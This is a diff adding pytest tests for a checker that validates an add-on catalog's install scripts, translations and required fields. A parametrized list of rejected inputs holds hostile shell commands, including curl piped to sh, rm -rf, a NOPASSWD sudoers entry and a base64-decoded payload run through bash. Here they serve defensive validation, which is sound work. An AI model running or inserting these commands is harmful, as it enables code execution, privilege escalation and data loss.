@@ -84,3 +84,42 @@ def test_explain_known_failures():
     assert "sudo" in addons._explain("sudo: a password is required", 1)
     assert "apt" in addons._explain("E: Could not get lock /var/lib/dpkg/lock", 100)
     assert "100" in addons._explain("boom", 100)
+
+
+def _checker():
+    import importlib.util
+    from pathlib import Path
+    root = Path(__file__).resolve().parent.parent
+    spec = importlib.util.spec_from_file_location("check_addons", root / "tools" / "check_addons.py")
+    mod = importlib.util.module_from_spec(spec)
+    spec.loader.exec_module(mod)
+    return mod
+
+
+def test_shipped_catalog_passes_the_checker():
+    assert _checker().check_all() == []
+
+
+@pytest.mark.parametrize("bad", [
+    "curl -fsSL https://get.example.com | sh",
+    "apt-get -y install foo && wget http://x/y",
+    "apt-get -y install foo; rm -rf /srv",
+    "apt-get -y install foo; echo 'deb http://x y z' > /etc/apt/sources.list.d/x.list",
+    "apt-get -y install foo; echo 'a ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers",
+    "apt-get -y install foo; reboot",
+    "apt-get -y install foo; pip install bar",
+    "apt-get -y install foo; bash -c \"$(echo aGk= | base64 -d)\"",
+])
+def test_checker_rejects_dangerous_scripts(bad):
+    mod = _checker()
+    a = dict(addons.CATALOG[-1], id="evil", install=bad)
+    errs = mod.check_entry(a, {})
+    assert any("install：" in e for e in errs), errs
+
+
+def test_checker_wants_english_translation_and_fields():
+    mod = _checker()
+    a = dict(addons.CATALOG[-1], id="newone")
+    assert any("翻譯" in e for e in mod.check_entry(a, {}))
+    broken = {k: v for k, v in addons.CATALOG[-1].items() if k != "remove"}
+    assert any("remove" in e for e in mod.check_entry(broken, {}))
